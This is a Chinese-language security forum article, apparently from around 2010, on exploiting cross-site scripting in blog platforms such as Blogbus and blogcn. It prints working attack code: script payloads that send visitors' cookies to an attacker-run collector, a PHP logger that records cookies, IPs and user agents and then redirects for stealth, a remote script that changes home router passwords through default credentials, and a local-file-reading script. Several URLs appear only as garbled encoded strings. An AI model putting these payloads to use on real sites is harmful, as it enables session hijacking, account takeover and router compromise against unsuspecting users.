
# [原创]跨站脚本攻击实例解析

作者：泉哥

主页：[5d7K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4u0A6N6i4y4C8M7$3E0Q4x3X3g2T1L8r3!0Y4j5Y4g2K6i4K6u0W2j5$3!0E0](https://bbs.kanxue.com/elink@44aK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4u0A6N6i4y4C8M7$3E0Q4x3X3g2T1L8r3!0Y4j5Y4g2K6i4K6u0W2j5$3!0E0)

## 前言

跨站攻击，即Cross Site Script Execution(通常简写为XSS，因为CSS与层叠样式表同名，故改为XSS) 是指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。很多人对于XSS的利用大多停留在弹框框的程度，一些厂商对XSS也是不以为然，都认为安全级别很低，甚至忽略不计。本文旨在讲述关于跨站攻击的利用方式，并结合实例进行分析。

## 漏洞测试

关于对XSS的漏洞测试，这里就以博客大巴为例进行测试，最近我也在上面发现了多处跨站漏洞，其中两处已公布在WooYun网站上，其主要内容如下：

```
漏洞详情
简要描述：
博客大巴存储型XSS漏洞
详细说明：
在“个人信息设置”的“附加信息”一项中，由于对“个人简介”的内容过滤不严，导致可在博客首页实现跨站，而在下方“添加一段附加信息”中，由于对“信息标题”内容过滤不严，同样可导致跨站的出现。
```

但我刚又测试了一下，发现官方只修补了其中一个漏洞（个人简介），而另一个漏洞得在博客管理后台才能触发，利用价值不大。与此同时我在对博客模板的测试中，又发现了五处跨站漏洞，估计这些漏洞其实很早就有人发现了，只是没人公布或者报给blogbus后仍未修补。这次报给WooYun的主要目的是让blogbus修补此漏洞，因为我的博客就在上面！^\_^ 其余五处漏洞分别在“编辑自定义模板”中，由于对代码模块`head`,`index`,`index-post`,`detail`,`detail-post`等处的代码过滤不严，导致跨站的发生，分别向其写入`<img src="#" onerror=alert("head")></img>`，为便于区别，我将提示语句更改为对应的名称，前三项在首页可触发脚本，后两项需打开文章才可触发，测试结果如图1、2所示：

![](https://bbs.kanxue.com/upload/attach/201011/124373_1p0fyjkx0454isl.jpg)

图1（在首页触发）

![](https://bbs.kanxue.com/upload/attach/201011/124373_nso2b4t5r3modrc.jpg)

图2（打开文章触发）

对于其它网站的测试基本也是大同小异，除了手工测试外，你还可使用其它一些自动扫描工具，比如Acunetix Web Scanner……

## 漏洞利用

### 一、窃取Cookie

对于跨站的攻击方法，使用最多的莫过于cookie窃取了，获取cookie后直接借助“明小子”工具或其它可修改cookie的浏览器（如装有Cookies Edit插件的Firefox）将cookie修改为获取的cookie，这样即可获得博客的管理权限。

首先，我们在自定义模板的head代码模块中写入

`<script>document.write('<img src="http://localhost/test.php?cookie='+document.cookie+'" width=0 height=0 border=0 />');</script>`

或者

`<script>document.location = 'ac3K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3I4G2j5$3q4D9K9r3!0K6N6q4)9J5c8Y4c8W2M7%4c8Q4x3X3g2H3K9s2m8Q4x3@1k6U0L8$3!0C8K9h3g2Q4x3@1c8Q4x3U0M7`. + document.cookie;</script>`

这里我把脚本放在本机上，你可以根据脚本地址来更改上面的localhost地址。以上两个均可达到同等效果，但就隐蔽性而言，前者的隐蔽性会更强些，读者可自行选择，当然也有其它语句可达到一样的目的，就看你如何发挥了。接下来我们来编写上面的test.php文件，它主要用于获取对方的cookie，其源代码如下：

```
<?php

$cookie = $_GET['cookie'];            //以GET方式获取cookie变量值
$ip = getenv ('REMOTE_ADDR');        //远程主机IP地址
$time=date('Y-m-d g:i:s');            //以“年-月-日 时：分：秒”的格式显示时间
$referer=getenv ('HTTP_REFERER');    //链接来源
$agent = $_SERVER['HTTP_USER_AGENT'];    //用户浏览器类型

$fp = fopen('cookie.txt', 'a');        //打开cookie.txt，若不存在则创建它
fwrite($fp," IP: " .$ip. "\n Date and Time: " .$time. "\n User Agent:".$agent."\n Referer: ".$referer."\n Cookie: ".$cookie."\n\n\n");    //写入文件
fclose($fp);    //关闭文件

header("Location: 2e6K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3u0S2K9h3c8#2i4K6u0W2j5$3!0E0");    //将网页重定向到百度，增强隐蔽性

?>
```

接下来我们访问博客首页，我这里以8abK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4q4#2j5h3&6Q4x3X3c8Y4k6g2)9J5k6h3u0D9L8$3N6T1N6i4y4Q4x3X3g2U0L8$3#2Q4c8e0c8Q4b7U0S2Q4b7V1q4Q4c8e0k6Q4b7U0g2Q4z5p5u0Q4c8e0S2Q4b7f1k6Q4z5e0g2Q4c8e0g2Q4z5f1y4Q4b7U0m8Q4c8e0g2Q4z5f1c8Q4z5o6m8Q4c8f1k6Q4b7V1y4Q4z5p5y4Q4c8e0S2Q4b7f1g2Q4b7V1k6Q4c8e0W2Q4z5e0N6Q4b7f1g2Q4c8e0g2Q4z5e0m8Q4z5p5g2Q4c8e0k6Q4z5o6S2Q4z5e0q4Q4c8e0c8Q4b7V1u0Q4b7f1y4Q4c8e0k6Q4z5o6W2Q4z5e0y4Q4c8e0g2Q4b7V1y4Q4z5o6m8Z5N6s2c8H3i4K6y4m8i4K6u0r3i4K6u0r3L8r3!0U0j5h3I4Z5L8%4y4@1i4K6u0r3j5$3!0G2K9$3W2W2i4K6u0W2N6s2S2@1 看看cookie.txt 文件是否被创建并写入数据，结果如图3所示：

![](https://bbs.kanxue.com/upload/attach/201011/124373_5o7snebj1baj5uv.jpg)

图3

很明显，我们已经成功窃取到cookie了，剩下的事相信大家都知道，这里就不再赘述。

### 二．渗透路由器

对于处于内网中的用户，我们可以利用XSS来更改路由器密码。我们可以借助默认的密码来登陆路由器，比如URL：053K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3q4V1L8h3W2F1i4K6y4m8j5h3c8E0K9h3&6Q4y4o6l9I4z5e0u0Q4x3X3f1I4y4U0S2Q4x3X3f1I4i4K6u0W2x3g2!0q4c8W2!0n7b7#2)9^5b7#2!0q4y4g2)9^5y4g2!0n7y4W2!0q4y4g2!0m8c8g2)9&6c8g2!0q4y4g2!0n7c8g2)9^5z5q4!0q4y4g2!0m8y4q4)9&6b7g2!0q4z5q4!0n7y4#2!0m8c8W2!0q4y4#2)9&6y4q4!0n7x3g2!0q4y4g2)9&6z5g2!0m8z5q4!0q4z5g2)9^5x3#2!0n7c8q4!0q4y4W2)9&6z5q4!0m8c8W2!0q4y4q4!0n7c8q4!0n7c8W2!0q4y4#2)9&6y4q4!0m8z5q4!0q4z5g2!0n7b7W2)9&6z5q4!0q4z5q4!0m8c8g2!0m8y4q4!0q4y4g2!0m8c8W2)9^5y4W2!0q4y4#2!0m8x3q4)9^5x3g2!0q4c8W2!0n7b7#2)9^5b7#2!0q4y4W2)9^5z5q4)9&6x3g2!0q4z5q4!0n7c8W2)9&6z5g2!0q4z5g2)9^5y4#2)9^5b7#2!0q4z5q4!0n7c8W2)9&6z5g2!0q4y4g2)9^5c8W2!0n7x3q4!0q4y4q4!0n7z5g2)9&6c8W2!0q4y4W2)9&6z5q4!0m8c8W2!0q4y4g2!0m8y4W2)9^5x3W2!0q4y4W2!0m8c8q4!0m8y4q4!0q4c8W2!0n7b7#2)9^5b7#2!0q4y4#2)9&6b7W2!0n7y4q4!0q4y4W2)9^5c8g2!0m8y4g2!0q4y4q4!0n7b7W2!0m8y4h3q4V1L8h3W2F1i4@1f1@1i4@1u0p5i4K6W2o6i4@1f1@1i4@1t1^5i4@1u0m8i4@1f1%4i4K6V1@1i4@1p5^5i4@1f1$3i4K6R3^5i4@1t1%4i4@1f1#2i4K6V1H3i4K6S2p5i4@1f1#2i4K6V1J5i4K6S2o6i4@1f1#2i4@1q4r3i4K6R3$3i4@1f1%4i4@1p5H3i4K6R3I4i4@1f1K6i4K6R3H3i4K6R3J5i4@1f1&6i4@1p5$3i4K6V1$3i4@1f1#2i4K6R3#2i4K6R3^5i4@1f1$3i4K6R3^5i4K6V1I4i4@1f1@1i4@1u0n7i4@1q4o6i4@1f1#2i4K6R3#2i4K6R3^5i4@1f1#2i4K6R3^5i4@1p5&6i4@1f1%4i4K6V1@1i4@1p5^5c8X3W2J5k6h3k6G2P5q4!0q4y4W2)9^5c8W2)9&6x3W2!0q4y4q4!0n7b7W2!0n7y4V1I4A6N6X3f1`. HTTP headers获取请求头，如图4所示：

![](https://bbs.kanxue.com/upload/attach/201011/124373_mwlvvte22m9w80b.jpg)

图4

因此我们可以在head代码模块中写入以下语句：

`<script src="http://localhost/1.js"></script>`

其中`1.js`源码如下：

`window.open("b90K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3q4V1L8h3W2F1i4K6y4m8j5h3c8E0K9h3&6Q4y4o6l9I4z5e0u0Q4x3X3f1I4y4U0S2Q4x3X3f1I4i4K6u0W2x3g2)9J5c8Y4g2K6k6i4u0d9M7r3#2Q4x3V1k6o6K9r3q4F1k6$3g2x3L8$3N6A6L8W2m8%4k6q4u0H3L8g2)9J5k6h3S2@1L8g2)9K6c8X3!0D9k6r3&6S2L8h3g2Q4x3@1c8S2k6r3#2A6L8W2)9J5y4X3!0D9k6s2m8S2M7%4y4%4L8%4u0V1i4K6y4p5j5h3c8E0K9h3&6Q4x3U0k6F1k6i4N6F1j5h3#2W2i4K6y4p5j5h3c8E0K9h3&6A6M7%4c8J5j5i4c8G2M7W2)9J5y4X3&6W2N6%4m8S2M7%4y4%4L8%4u0V1i4K6y4p5M7r3q4K6M7%4N6G2M7X3c8Q4x3U0k6F1k6i4N6H3j5i4y4K6N6$3!0J5k6o6u0Q4x3@1c8H3j5i4y4K6N6$3!0J5k6q4)9J5y4W2y4S2N6X3g2Q4x3@1c8Q4x3U0g2n7x3g2)9J5y4f1p5K6i4K6u0n7i4K6t1#2b7U0c8Q4x3U0g2q4y4R3`.`.");`

下面我们试着用cc2K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3&6W2N6$3q4V1L8h3W2F1i4K6y4m8L8X3g2%4M7r3q4K6M7#2)9@1x3o6p5&6x3W2)9J5k6e0p5$3z5q4)9J5k6e0q4Q4x3X3f1I4i4@1f1%4i4K6V1&6i4@1u0n7i4@1f1&6i4K6V1&6i4K6R3$3i4@1g2r3i4@1u0o6i4K6S2o6i4@1f1%4i4@1u0n7i4K6V1K6i4@1f1$3i4K6W2q4i4K6W2o6i4@1f1#2i4@1p5$3i4K6R3J5i4@1f1#2i4K6W2n7i4@1u0q4y4g2!0q4y4W2)9^5z5g2)9^5x3q4!0q4y4#2!0m8y4q4!0n7b7g2!0q4c8W2!0n7b7#2)9&6b7b7`.

![](https://bbs.kanxue.com/upload/attach/201011/124373_rm9u2r7jzwdh2kg.jpg)

图5

可见密码已经修改成功！

### 三、读取本地文件

在不同的浏览器中对本地文件的读取有着不同的限制，之前XEYE team曾有过统计，具体内容如下：

1: IE6可读取无限制本地文件.ie8以及相应版本的trident内核浏览器对ajax本地执行时的权限控制得很死的，看来MS对IE这类安全风险比较重视。

2: FF3.0.8及以下版本允许本地执行的ajax访问当前目录下的文件内容。其他目录暂无法访问。

3: opera9.64及以下版本允许通过指定url为file://协议进行访问；如果文件在当前目录下，则不需要指定file://协议；如果文件在同一盘符下甚至可以超越目录的方式访问:../../boot.ini。

4: 基于webkit内核：google chrome、遨游3.0、safari等浏览器对本地执行的ajax权限没做任何访问限制.

以上测试是利用ajax来读取文件的。但是我在windows7平台上用php测试各个最新版浏览器时发现：

1、 Firefox 3.6.10、搜狗浏览器 2.2.0.1423、Maxthon 2.5.14、IE8、Chrome 7.0.513.0、360浏览器3.5、世界之窗3.2、TT浏览器4.8均可跨目录读取本地文件。

2、 Opera 10.70不允许读取本地文件，若是读取本地文件会直接给出警告，但你仍可选择继续读取。

我测试用的PHP脚本（该脚本位于`D:\riusksk\Webroot\reader.php`）代码如下：

```
<?php
$handle = fopen("file://c:\sysiclog.txt", "rb") or die("can't open file");
$contents = '';
while (!feof($handle)) {
    $contents .= fread($handle, 1024);
}
$contents=urldecode($contents);
echo $contents;
//$fp = fopen('info.txt', 'a');
//fwrite($fp,$contents);
//fclose($fp);
fclose($handle);
?>
```

在存在XSS的地方嵌入上面php文件，方法与cookie劫持一样。由于现在blogbus打不开，可能又是服务器搬迁。这里我以blogcn.com上的漏洞为例进行测试， Firefox下的情况如图6所示：

![](https://bbs.kanxue.com/upload/attach/201011/124373_eweromt8tge8ud3.jpg)

图6

谷歌浏览器Chrome情况如图7所示：

![](https://bbs.kanxue.com/upload/attach/201011/124373_6ft7ac0o9tofyyv.jpg)

图7

搜狗浏览器下的情况如图8所示：

![](https://bbs.kanxue.com/upload/attach/201011/124373_whnj9keqx4qxras.jpg)

图8

傲游浏览器下的情况：

![](https://bbs.kanxue.com/upload/attach/201011/124373_kwop2k05esj309a.jpg)

图9

IE8下的情况如图10所示：

![](https://bbs.kanxue.com/upload/attach/201011/124373_9mjgye8awjbzuzg.jpg)

图10
